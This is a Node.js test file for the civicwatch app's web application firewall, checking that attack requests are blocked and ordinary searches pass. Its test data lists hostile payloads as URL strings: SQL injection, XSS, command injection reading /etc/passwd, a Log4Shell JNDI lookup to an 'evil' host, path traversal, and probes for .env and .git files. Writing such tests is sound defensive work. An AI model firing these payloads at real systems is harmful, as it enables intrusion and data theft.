// Run: node --test scripts/test-waf.mjs
// Guards both directions: attacks must be caught, and normal civicwatch traffic
// (searches, Clerk/Stripe redirects, bill titles full of "select"/"union") must not be.
import test from 'node:test'
import assert from 'node:assert/strict'
import { inspectRequest } from '../lib/security/waf.mjs'

const check = (url, userAgent = 'Mozilla/5.0 (Macintosh)', referer = '') => {
  const u = new URL(url, 'https://civicwatch.app')
  return inspectRequest({ pathname: u.pathname, searchParams: u.searchParams, userAgent, referer })
}

test('blocks common attacks', () => {
  const attacks = {
    sqli: [
      '/api/congress?q=x%27%20OR%201=1--',
      '/api/congress?q=1%20UNION%20SELECT%20username,password%20FROM%20users',
      '/api/civic?zip=1;%20DROP%20TABLE%20users',
      '/api/stats?id=1%20AND%20SLEEP(5)',
      '/api/stats?x=information_schema.tables',
    ],
    xss: ['/dashboard?q=%3Cscript%3Ealert(1)%3C/script%3E', '/trades?x=javascript:alert(1)', '/pro?a=%22%20onerror=alert(1)'],
    rce: ['/api/civic?x=$(whoami)', '/api/civic?x=%24%7Bjndi:ldap://evil/a%7D', '/api/civic?f=/etc/passwd', '/api/civic?x=a;cat%20/etc/hosts'],
    traversal: ['/api/rep-photo/..%2f..%2fetc%2fpasswd', '/api/civic?f=..%252f..%252fsecret'],
    probe: ['/.env', '/.git/config', '/wp-login.php', '/phpmyadmin/', '/xmlrpc.php', '/shell.php'],
  }
  for (const [family, urls] of Object.entries(attacks)) {
    for (const url of urls) {
      const hit = check(url)
      assert.ok(hit, `should block ${url}`)
      assert.equal(hit.rule, family, `${url} classified as ${hit?.rule}, expected ${family}`)
    }
  }
})

test('blocks scanner user agents and header payloads', () => {
  assert.equal(check('/', 'sqlmap/1.7').rule, 'scanner')
  assert.equal(check('/', 'Mozilla/5.0'), null)
  assert.equal(check('/', '${jndi:ldap://x/a}').rule, 'rce')
})

test('allows normal traffic', () => {
  const ok = [
    '/',
    '/dashboard?state=CA&district=12',
    '/api/congress?q=Nancy%20Pelosi',
    '/api/congress?q=O%27Brien',
    '/trades?ticker=NVDA&type=purchase',
    '/api/civic?zip=90210',
    '/api/representatives?q=select%20committee%20on%20intelligence',
    '/api/leaderboard?sort=union%20workers%20bill',
    '/accountability?tab=trades&order=desc',
    '/sign-in?redirect_url=https%3A%2F%2Fcivicwatch.app%2Fdashboard',
    '/pro?session_id=cs_test_a1B2c3D4e5F6g7H8',
    '/robots.txt',
    '/.well-known/apple-app-site-association',
  ]
  for (const url of ok) assert.equal(check(url), null, `false positive on ${url}`)
})

test('skips opaque Clerk handshake tokens', () => {
  const jwt = 'eyJhbGciOiJSUzI1NiJ9.' + 'a'.repeat(1500) + "'--" // would trip sqli if inspected
  assert.equal(check(`/dashboard?__clerk_handshake=${jwt}`), null)
})

test('handles malformed encoding without throwing', () => {
  assert.doesNotThrow(() => check('/api/civic?x=%E0%A4%A'))
  assert.doesNotThrow(() => check('/api/civic?x=%'))
})
